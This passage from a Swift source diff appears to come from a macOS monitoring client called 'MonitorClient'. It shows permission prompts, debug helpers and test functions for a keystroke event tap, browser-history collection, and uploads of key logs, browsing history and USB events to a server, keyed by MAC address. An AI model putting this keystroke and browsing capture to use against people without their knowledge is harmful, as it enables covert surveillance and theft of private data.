+                // Try System Settings first (macOS 13+)
+                if NSWorkspace.shared.open(URL(string: "x-apple.systempreferences:")!) {
+                    return true
+                }
+                
+                // Fallback to System Preferences
+                if let url = URL(string: "x-apple.systempreferences:com.apple.preference.security") {
+                    NSWorkspace.shared.open(url)
+                    return true
+                }
+                
+                return false
+            }
+        ]
+        
+        // Try each approach
+        for (index, approach) in approaches.enumerated() {
+            if approach() {
+                logMessage("Successfully opened System Settings using approach \(index + 1)", level: .info)
+                return
+            }
+        }
+        
+        // If all approaches fail, provide manual instructions
+        logMessage("Failed to open System Settings automatically", level: .warning)
+        logMessage("Please manually open System Settings > Privacy & Security > Accessibility", level: .info)
+        logMessage("Then add this app to the Accessibility list", level: .info)
+        
+        // Show a user notification with manual instructions
+        let notification = NSUserNotification()
+        notification.title = "Manual Accessibility Setup Required"
+        notification.informativeText = "Please open System Settings > Privacy & Security > Accessibility and add this app"
+        notification.soundName = NSUserNotificationDefaultSoundName
+        
+        NSUserNotificationCenter.default.deliver(notification)
+    }
+    
+    // Check accessibility permission periodically and request if needed
+    private func checkAccessibilityPermissionPeriodically() {
+        // Check every 30 seconds
+        let lastCheck = storage.double(forKey: "last-accessibility-check")
+        let currentTime = Date().timeIntervalSince1970
+        
+        if currentTime - lastCheck > 30 {
+            storage.set(currentTime, forKey: "last-accessibility-check")
+            
+            if !isInputMonitoringEnabled() {
+                logMessage("Periodic accessibility check: permission not granted, requesting...", level: .info)
+                
+                // Show user notification about accessibility permission
+                let notification = NSUserNotification()
+                notification.title = "MonitorClient Needs Accessibility Permission"
+                notification.informativeText = "Please grant accessibility permission to enable keyboard monitoring"
+                notification.soundName = NSUserNotificationDefaultSoundName
+                notification.actionButtonTitle = "Open Settings"
+                notification.otherButtonTitle = "Later"
+                
+                NSUserNotificationCenter.default.deliver(notification)
+                
+                requestAccessibilityPermission()
+            } else {
+                logMessage("Periodic accessibility check: permission granted", level: .debug)
+            }
+        }
+    }
+    
+    // Test network connectivity to server
+    @objc func testServerConnectivity() {
+        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
+            logError("Cannot test connectivity - invalid endpoint", context: "Connectivity")
+            return
+        }
+        
+        logMessage("Testing connectivity to: \(urlString)", level: .info)
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+        request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
+        request.timeoutInterval = 10.0
+        
+        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+            DispatchQueue.main.async {
+                if let error = error {
+                    self?.logError("Connectivity test failed: \(error)", context: "Connectivity")
+                    return
+                }
+                
+                if let httpResponse = response as? HTTPURLResponse {
+                    self?.logSuccess("Connectivity test successful", details: "HTTP \(httpResponse.statusCode)")
+                } else {
+                    self?.logError("Connectivity test failed - no HTTP response", context: "Connectivity")
+                }
+            }
+        }
+        task.resume()
+    }
+    
+    // MARK: - NSUserNotificationCenterDelegate
+    
+    func userNotificationCenter(_ center: NSUserNotificationCenter, didActivate notification: NSUserNotification) {
+        if notification.actionButtonTitle == "Open Settings" {
+            openAccessibilityPreferences()
+        }
+    }
+    
+    func userNotificationCenter(_ center: NSUserNotificationCenter, shouldPresent notification: NSUserNotification) -> Bool {
+        return true
+    }
+
+    // Debug method to check accessibility permission status
+    @objc func debugAccessibilityStatus() {
+        logMessage("=== Accessibility Permission Debug ===", level: .info)
+        
+        // Check current permission status
+        let isTrusted = AXIsProcessTrusted()
+        logMessage("AXIsProcessTrusted(): \(isTrusted)", level: .info)
+        
+        // Check app bundle identifier
+        if let bundleId = Bundle.main.bundleIdentifier {
+            logMessage("Bundle Identifier: \(bundleId)", level: .info)
+        }
+        
+        // Check if app is running from Xcode
+        let isRunningFromXcode = ProcessInfo.processInfo.environment["XPC_SERVICE_NAME"] != nil || 
+                                ProcessInfo.processInfo.environment["XCODE_RUNNING_FOR_PREVIEWS"] == "1"
+        logMessage("Running from Xcode: \(isRunningFromXcode)", level: .info)
+        
+        // Check app path
+        let appPath = Bundle.main.bundlePath
+        logMessage("App Path: \(appPath)", level: .info)
+        
+        // Check if app is in Applications folder
+        let isInApplications = appPath.contains("/Applications/")
+        logMessage("In Applications folder: \(isInApplications)", level: .info)
+        
+        // Check stored permission flags
+        let promptShown = storage.bool(forKey: "accessibility-prompt-shown")
+        let lastTrusted = storage.bool(forKey: "last-accessibility-trusted")
+        logMessage("Stored flags - Prompt shown: \(promptShown), Last trusted: \(lastTrusted)", level: .info)
+        
+        // Check event tap status
+        if let tap = eventTap {
+            let isEnabled = CGEvent.tapIsEnabled(tap: tap)
+            let portValid = CFMachPortIsValid(tap)
+            logMessage("Event tap - Enabled: \(isEnabled), Port valid: \(portValid)", level: .info)
+        } else {
+            logMessage("Event tap: nil", level: .info)
+        }
+        
+        logMessage("=== End Debug ===", level: .info)
+    }
+    
+    // Test keyboard monitoring manually
+    @objc func testKeyboardMonitoring() {
+        logMessage("=== Testing Keyboard Monitoring ===", level: .info)
+        
+        // Check permission
+        if isInputMonitoringEnabled() {
+            logMessage("✅ Accessibility permission granted", level: .info)
+            
+            // Try to setup keyboard monitoring
+            setupKeyboardMonitoring()
+            
+            // Check if event tap was created
+            if let tap = eventTap {
+                let isEnabled = CGEvent.tapIsEnabled(tap: tap)
+                logMessage("✅ Event tap created and enabled: \(isEnabled)", level: .info)
+                
+                // Add a test key log
+                let testKeyLog = KeyLog(date: getCurrentDateTimeString(), application: "Test", key: "TEST_KEY")
+                keyLogs.append(testKeyLog)
+                logMessage("✅ Added test key log, total count: \(keyLogs.count)", level: .info)
+                
+            } else {
+                logMessage("❌ Failed to create event tap", level: .error)
+            }
+        } else {
+            logMessage("❌ Accessibility permission not granted", level: .error)
+        }
+        
+        logMessage("=== End Test ===", level: .info)
+    }
+    
+    // Test browser history collection manually
+    @objc func testBrowserHistoryCollection() {
+        logMessage("=== Testing Browser History Collection ===", level: .info)
+        
+        do {
+            let histories = try getBrowserHistories() ?? []
+            logMessage("✅ Collected \(histories.count) browser history entries", level: .info)
+            
+            // Log a sample of the histories
+            let sampleCount = min(3, histories.count)
+            for i in 0..<sampleCount {
+                let history = histories[i]
+                logMessage("Sample history \(i+1): \(history.browser) - \(history.url)", level: .debug)
+            }
+            
+            // Send the histories
+            if histories.count > 0 {
+                sendDataInChunks(data: histories, eventType: "BrowserHistory", chunkSize: 1000)
+                logMessage("✅ Browser histories sent to server", level: .info)
+            } else {
+                logMessage("ℹ️  No browser histories to send", level: .info)
+            }
+            
+        } catch {
+            logError("Failed to collect browser histories: \(error)", context: "BrowserHistoryTest")
+        }
+        
+        logMessage("=== End Browser History Test ===", level: .info)
+    }
+    
+    // Check app entitlements and provide debugging guidance
+    @objc func checkAppEntitlements() {
+        logMessage("=== App Entitlements Check ===", level: .info)
+        
+        // Check if app has accessibility entitlements
+        let hasAccessibilityEntitlement = Bundle.main.object(forInfoDictionaryKey: "NSAppleEventsUsageDescription") != nil ||
+                                         Bundle.main.object(forInfoDictionaryKey: "NSSystemAdministrationUsageDescription") != nil
+        
+        logMessage("Has accessibility entitlements: \(hasAccessibilityEntitlement)", level: .info)
+        
+        // Check if running in sandbox
+        let isSandboxed = Bundle.main.object(forInfoDictionaryKey: "com.apple.security.app-sandbox") != nil
+        logMessage("App is sandboxed: \(isSandboxed)", level: .info)
+        
+        // Check if running from Xcode
+        let isRunningFromXcode = ProcessInfo.processInfo.environment["XPC_SERVICE_NAME"] != nil || 
+                                ProcessInfo.processInfo.environment["XCODE_RUNNING_FOR_PREVIEWS"] == "1"
+        logMessage("Running from Xcode: \(isRunningFromXcode)", level: .info)
+        
+        // Provide guidance based on the situation
+        if isRunningFromXcode {
+            logMessage("⚠️  Running from Xcode - accessibility permissions may not work properly", level: .warning)
+            logMessage("💡 Try building and running the app outside of Xcode", level: .info)
+        }
+        
+        if isSandboxed {
+            logMessage("⚠️  App is sandboxed - this may affect accessibility permissions", level: .warning)
+        }
+        
+        if !hasAccessibilityEntitlement {
+            logMessage("⚠️  App may be missing accessibility entitlements", level: .warning)
+            logMessage("💡 Check your app's entitlements file", level: .info)
+        }
+        
+        logMessage("=== End Entitlements Check ===", level: .info)
+    }
+    
+    // Test server endpoint with a simple key log
+    @objc func testServerEndpoint() {
+        logMessage("=== Testing Server Endpoint ===", level: .info)
+        
+        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
+            logError("Cannot test endpoint - invalid URL", context: "ServerTest")
+            return
+        }
+        
+        logMessage("Testing endpoint: \(urlString)", level: .info)
+        
+        // Prepare test data (matching Windows format)
+        var postData: [String: Any] = [
+            "Event": "KeyLog",
+            "Version": APP_VERSION,
+            "MacAddress": macAddress,
+            "KeyLogs": [
+                [
+                    "date": getCurrentDateTimeString(),
+                    "application": "TestApp (com.test.app)",
+                    "key": "TEST_KEY"
+                ]
+            ]
+                ]
+        
+        // Convert to JSON
+        guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
+            logError("Failed to serialize test JSON data", context: "ServerTest")
+            return
+        }
+        
+        // Create request
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
+        request.timeoutInterval = 30.0
+        request.httpBody = jsonData
+        
+        logMessage("Sending test request...", level: .info)
+        logMessage("Request body size: \(jsonData.count) bytes", level: .debug)
+        logMessage("Request headers: \(request.allHTTPHeaderFields ?? [:])", level: .debug)
+        
+        // Log the actual JSON being sent
+        if let jsonString = String(data: jsonData, encoding: .utf8) {
+            logMessage("Request JSON: \(jsonString)", level: .debug)
+        }
+        
+        // Send request
+        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+            DispatchQueue.main.async {
+                if let error = error {
+                    self?.logError("Test request failed: \(error)", context: "ServerTest")
+                    self?.logError("Error details: \(error.localizedDescription)", context: "ServerTest")
+                    return
+                }
+                
+                if let httpResponse = response as? HTTPURLResponse {
+                    self?.logMessage("Test HTTP response: \(httpResponse.statusCode)", level: .info)
+                    self?.logMessage("Response headers: \(httpResponse.allHeaderFields)", level: .debug)
+                    
+                    if httpResponse.statusCode != 200 {
+                        self?.logError("Test HTTP error: \(httpResponse.statusCode)", context: "ServerTest")
+                    }
+                }
+                
+                if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                    self?.logSuccess("Test request successful", details: "Response: \(responseString)")
+                    self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
+                } else {
+                    self?.logError("No response data received for test request", context: "ServerTest")
+                    if let data = data {
+                        self?.logMessage("Raw response data: \(data)", level: .debug)
+                    }
+                }
+            }
+        }
+        task.resume()
+        
+        logMessage("=== End Server Test ===", level: .info)
+    }
+    
+    // Test server with different data formats
+    @objc func testServerFormats() {
+        logMessage("=== Testing Different Server Formats ===", level: .info)
+        
+        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
+            logError("Cannot test formats - invalid URL", context: "FormatTest")
+            return
+        }
+        
+        // Test 1: Simple Tic event (should work)
+        testFormat(url: url, data: [
+            "Event": "Tic",
+            "Version": APP_VERSION,
+            "MacAddress": macAddress
+        ], name: "Tic Event")
+        
+        // Test 2: Empty KeyLogs array
+        testFormat(url: url, data: [
+            "Event": "KeyLog",
+            "Version": APP_VERSION,
+            "MacAddress": macAddress,
+            "KeyLogs": []
+        ], name: "Empty KeyLogs")
+        
+        // Test 3: Single key log (matching Windows format)
+        testFormat(url: url, data: [
+            "Event": "KeyLog",
+            "Version": APP_VERSION,
+            "MacAddress": macAddress,
+            "KeyLogs": [
+                [
+                    "date": getCurrentDateTimeString(),
+                    "application": "TestApp (com.test.app)",
+                    "key": "A"
+                ]
+            ]
+        ], name: "Single KeyLog")
+        
+        // Test 4: Single browser history (matching Windows format)
+        testFormat(url: url, data: [
+            "Event": "BrowserHistory",
+            "Version": APP_VERSION,
+            "MacAddress": macAddress,
+            "BrowserHistories": [
+                [
+                    "browser": "Safari",
+                    "url": "https://example.com",
+                    "title": "Example Page",
+                    "last_visit": 1234567890,
+                    "date": getCurrentDateTimeString()
+                ]
+            ]
+        ], name: "Single BrowserHistory")
+        
+        // Test 5: Single USB log (matching Windows format)
+        testFormat(url: url, data: [
+            "Event": "USBLog",
+            "Version": APP_VERSION,
+            "MacAddress": macAddress,
+            "USBLogs": [
+                [
+                    "date": getCurrentDateTimeString(),
+                    "device_name": "Test USB Device",
+                    "device_path": "USB Device Path",
+                    "device_type": "USB Device",
+                    "action": "Connected"
+                ]
+            ]
+        ], name: "Single USBLog")
+    }
+    
+    private func testFormat(url: URL, data: [String: Any], name: String) {
+        logMessage("Testing format: \(name)", level: .info)
+        
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: data)
+            
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+            request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
+            request.timeoutInterval = 30.0
+            request.httpBody = jsonData
+            
+            let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+                DispatchQueue.main.async {
+                    if let error = error {
+                        self?.logError("\(name) failed: \(error)", context: "FormatTest")
+                        return
+                    }
+                    
+                    if let httpResponse = response as? HTTPURLResponse {
+                        if httpResponse.statusCode == 200 {
+                            self?.logSuccess("\(name) successful", details: "HTTP \(httpResponse.statusCode)")
+                        } else {
+                            self?.logError("\(name) failed - HTTP \(httpResponse.statusCode)", context: "FormatTest")
+                        }
+                    }
+                    
+                    if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                        self?.logMessage("\(name) response: \(responseString)", level: .debug)
+                    }
+                }
+            }
+            task.resume()
+            
+        } catch {
+            logError("Failed to test \(name): \(error)", context: "FormatTest")
         }
     }
 }
